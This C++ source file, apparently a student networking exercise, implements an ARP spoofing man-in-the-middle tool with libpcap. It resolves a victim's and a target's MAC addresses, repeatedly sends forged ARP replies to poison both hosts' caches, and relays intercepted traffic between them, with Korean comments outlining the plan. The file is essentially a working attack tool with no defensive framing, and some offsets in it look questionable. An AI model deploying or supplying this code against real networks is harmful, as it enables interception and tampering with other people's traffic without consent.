#include "get_my_mac.h"
#include "get_my_ip.h"
#include "send_arp_packet.h"
#include "cap_mac.h"
#define ARP_SENDER 3
#define ARP_TARGET 4
#define OTHER_SENDER 1
#define OTHER_TARGET 2
#define UDP 17

#pragma pack(push, 1)

#pragma pack(pop)


uint8_t my_mac[6] = {0,};
char my_ip[INET_ADDRSTRLEN] = {0,};

// -------------- SHOW PACKET -------------

// -------------- SHOW PACKET -------------

// 패킷을 받으면
// 내 mac으로 바꾸고
// capture한 ip로 바꾸고
// capture한 mac으로 바꾸고

// capture한 

// ip랑 mac은 놔둬야지


// 일반 패킷

// 구글에서 온거:
// mac addr만 바꾼다

// you에서 온거:
// mac addr만 바꾼다.

// arp 패킷
// 구글에서 온거:
// victim에게 arp 패킷을 다시 보낸다.

// victim에서 온거
// google로 arp 패킷을 다시 보낸다.

int define_packet(const u_char *text, uint8_t send_mac[6]) {
    int flag = 1;
    if (!memcmp(text, send_mac, 6)) flag += 1; //if 같으면 dst가 send이니까 tar에게 보내야됩니다.
    if (*(uint16_t*)(text+ 0x16) == 0x0608) flag += 2; // if 같으면 arp 니까 vic에 send arp
    return flag;
}

pcap_t* handle;
void relay_packet(const u_char * text, uint8_t mac[6]){
    memcpy((void*)text, mac, 6);
    memcpy((void*)(text+6), my_mac, 6);
     int res = pcap_sendpacket(handle, text, ntohs(*(uint16_t *)(text+0x10)) + 14);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}
// --------------- MAIN -------------------
int main(int argc, char* argv[]) {
// --------------- PCAP_OPEN --------------
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
		return -1;
	}
// --------------- PCAP_OPEN --------------

// --------------- MY INFO ----------------
    get_my_mac(argv[1], my_mac);
    get_my_ip(argv[1], my_ip);
// --------------- MY INFO ----------------


// --------------- GET SENDER -------------
	EthArpPacket packet;
    send_arp_packet(packet, argv[2]);
    uint8_t cap_sender_mac[6];
    cap_mac(argv[2], cap_sender_mac);
// --------------- GET SENDER -------------

// --------------- GET TARGET -------------
    send_arp_packet(packet,argv[3]);
    uint8_t cap_target_mac[6];
    cap_mac(argv[3], cap_target_mac);
// --------------- GET TARGET -------------

    while(1){
        pcap_pkthdr *header;
        const u_char *text;
        int res = pcap_next_ex(handle, &header, &text );
        if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_e./x return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
        int flag = define_packet(text, cap_sender_mac);
        switch (flag){
            case ARP_SENDER:
                send_arp_packet(packet, argv[2], argv[3], cap_sender_mac);    
                break;
            case ARP_TARGET:
                send_arp_packet(packet, argv[3], argv[2], cap_target_mac);
                break;
            case OTHER_SENDER:
                relay_packet(text, cap_sender_mac);
                break;
            case OTHER_TARGET:
                relay_packet(text, cap_target_mac);
                break;
        }
    }
// --------------- GET PACKET -------------
	pcap_close(handle);
}
